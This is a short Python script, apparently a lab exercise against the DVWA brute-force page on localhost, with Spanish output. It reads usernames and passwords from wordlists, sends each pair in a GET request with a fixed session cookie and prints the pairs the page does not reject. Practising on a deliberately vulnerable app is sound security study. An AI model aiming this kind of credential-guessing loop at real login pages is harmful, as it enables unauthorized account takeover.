import sys
import requests

def readf(rf):
    with open(rf,mode='r', encoding='utf-8') as diccionario:
        return diccionario.read()


cookie = {"PHPSESSID":"a8hfgghak0ekquhks00u627t63", "security":"low"}

user = readf("dic.txt").split("\n")
passwordd= readf("shortspw.txt").split("\n")

for i in user:
    for j in passwordd:
        url = f"http://localhost:8081/vulnerabilities/brute/?username={i}&password={j}&Login=Login#"
        response = requests.get(url,cookies=cookie)

        if not "Username and/or password incorrect." in response.text:
            print(f"EL USUARIO: {i} : {j} es valido")

 
